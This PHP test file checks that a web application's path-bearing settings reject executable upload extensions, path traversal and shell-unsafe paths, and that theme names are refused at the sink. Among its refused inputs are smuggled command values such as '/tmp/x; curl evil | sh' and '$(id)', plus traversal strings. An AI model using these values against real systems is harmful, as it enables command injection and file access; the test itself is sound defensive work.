<?php
/** @joinery-test
 * name: setting_path_refusals
 * tier: safe
 * env: any
 * needs: []
 */
/**
 * A setting whose value becomes a path the server requires, executes or
 * matches uploads against is bounded at the setting and at the sink
 * (specs/security_inventory.md S2, inventory in S3).
 *
 *  - The declared validation refuses an executable upload extension, a
 *    composer path outside vendor/, a theme or plugin name that is not a
 *    folder name, and a shell-unsafe node or log path.
 *  - Each is vault gated, so changing one needs an open unlock window.
 *  - PathHelper refuses a theme name that is not a folder name, whatever
 *    the setting says.
 *
 * @version 1.1 - upgrade_source (specs/package_signing.md WP7)
 * @version 1.0
 */
require_once(__DIR__ . '/../lib/harness.php');
harness_boot();
if (session_status() === PHP_SESSION_NONE) {
	session_start();   // SettingsWriter::validate builds a FormWriter, which wants one
}

function refused_by_declaration(string $name, string $value): bool {
	$errors = SettingsWriter::validate([$name => $value]);
	return !empty($errors[$name]);
}

section('allowed_upload_extensions: never an extension the server executes');
foreach (['gif,jpeg,jpg,png,pdf', 'jpg', 'phpx,jpg', 'php5x'] as $ok) {
	check(!refused_by_declaration('allowed_upload_extensions', $ok), "accepts '$ok'");
}
foreach (['jpg,php', 'php', 'jpg,PHP', 'jpg,php5', 'phtml,jpg', 'jpg,phar,png', 'jpg,sh', 'jpg,cgi', 'jpg, png', 'jpg;php', '.jpg', 'jpg,'] as $bad) {
	check(refused_by_declaration('allowed_upload_extensions', $bad), "refuses '$bad'");
}

section('composerAutoLoad: the vendor tree and nothing else');
foreach (['../vendor/', 'vendor/'] as $ok) {
	check(!refused_by_declaration('composerAutoLoad', $ok), "accepts '$ok'");
}
foreach (['../vendor', '/tmp/', '../../evil/', '../vendor/../', 'vendor/x/', 'http://x/'] as $bad) {
	check(refused_by_declaration('composerAutoLoad', $bad), "refuses '$bad'");
}

section('theme_template and active_theme_plugin: a folder name only');
foreach (['default', 'joinery-system', 'plugin', 'my_theme2'] as $ok) {
	check(!refused_by_declaration('theme_template', $ok), "theme_template accepts '$ok'");
}
foreach (['../uploads', 'theme/../x', 'a/b', 'default ', '.hidden', 'x;y'] as $bad) {
	check(refused_by_declaration('theme_template', $bad), "theme_template refuses '$bad'");
	check(refused_by_declaration('active_theme_plugin', $bad), "active_theme_plugin refuses '$bad'");
}

section('node_dir, apache_error_log, agent source path: a plain absolute path');
foreach (['node_dir', 'apache_error_log', 'server_manager_agent_source_path'] as $name) {
	check(!refused_by_declaration($name, '/var/www/html/site/node'), "$name accepts a plain absolute path");
	check(!refused_by_declaration($name, '/var/log/apache2/error.log'), "$name accepts a dotted file name");
	foreach (['relative/path', '/tmp/x; curl evil | sh', '/tmp/$(id)', '/tmp/a b', '/tmp/`id`', "/tmp/x\n/etc"] as $bad) {
		check(refused_by_declaration($name, $bad), "$name refuses " . json_encode($bad));
	}
}

section('upgrade_source: an https origin and nothing else (specs/package_signing.md WP7)');
// The setting that became a download. Root verifies every archive it fetches
// against the release key, so the setting can only choose where a verified
// archive comes from; the bound keeps a typo from becoming a refused upgrade,
// and keeps the fetch off plain http.
foreach (['https://getjoinery.com', 'https://dev.getjoinery.com', 'https://node.example.org:8443', 'https://10.0.0.5'] as $ok) {
	check(!refused_by_declaration('upgrade_source', $ok), "upgrade_source accepts '$ok'");
}
foreach (['http://getjoinery.com', 'https://getjoinery.com/', 'https://getjoinery.com/path', 'getjoinery.com',
          'https://evil.example/?x=', 'https://a b', "https://x.example\nhttps://y", 'ftp://x.example'] as $bad) {
	check(refused_by_declaration('upgrade_source', $bad), "upgrade_source refuses " . json_encode($bad));
}
// Empty is "no source": the marketplace and the upgrade both say so and fetch nothing.
check(!refused_by_declaration('upgrade_source', ''), "upgrade_source accepts empty, which means no source");

section('Changing one is a credential event');
foreach (['allowed_upload_extensions', 'composerAutoLoad', 'theme_template', 'active_theme_plugin', 'node_dir', 'server_manager_agent_source_path', 'upgrade_source'] as $name) {
	check(SettingsDeclarations::isVaultGated($name), "$name is vault gated");
}

section('The sink refuses a bad theme name whatever the setting says');
foreach (['default', 'theme/default', 'plugins/store', 'joinery-system'] as $ok) {
	$threw = false;
	try { PathHelper::assertThemeName($ok); } catch (Exception $e) { $threw = true; }
	check(!$threw, "assertThemeName accepts '$ok'");
}
foreach (['../uploads', 'theme/../../uploads', 'plugins/../x', 'a/b', "default\n", 'theme/', 'uploads/x'] as $bad) {
	$threw = false;
	try { PathHelper::getThemeFilePath('index.php', 'views', 'system', $bad, null, false, false); } catch (Exception $e) { $threw = true; }
	check($threw, 'getThemeFilePath refuses theme name ' . json_encode($bad));
}
$path = PathHelper::getThemeFilePath('index.php', 'views', 'system', null, '../uploads', false, false);
check($path !== false && strpos($path, '..') === false, 'a plugin name that is not a folder name is not a plugin: the chain falls through to core');

harness_finish();
